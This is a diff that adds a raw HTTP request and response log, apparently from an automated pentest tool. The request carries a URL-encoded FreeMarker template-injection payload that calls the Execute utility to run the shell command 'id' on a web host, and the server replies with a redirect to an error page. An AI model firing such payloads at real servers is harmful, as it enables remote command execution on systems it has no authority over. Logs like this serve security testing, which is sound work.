@@ -1,0 +1,21 @@
+REQUEST:
+GET https://stirling-pdf.baliprov.dev/search?q=%3C%23assign%20x%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%20%24%7Bx%28%22id%22%29%7D
+User-Agent: pentest-ai/1.6.2 (compatible; rv:a2cfe36ea2c0; +https://pentestai.xyz)
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+
+
+
+RESPONSE:
+HTTP 302
+Date: Wed, 25 Nov 2026 00:25:39 GMT
+Content-Length: 0
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Pragma: no-cache
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Frame-Options: DENY
+Cache-Control: must-revalidate,no-cache,no-store
+Vary: Access-Control-Request-Headers
+Location: /error?
+
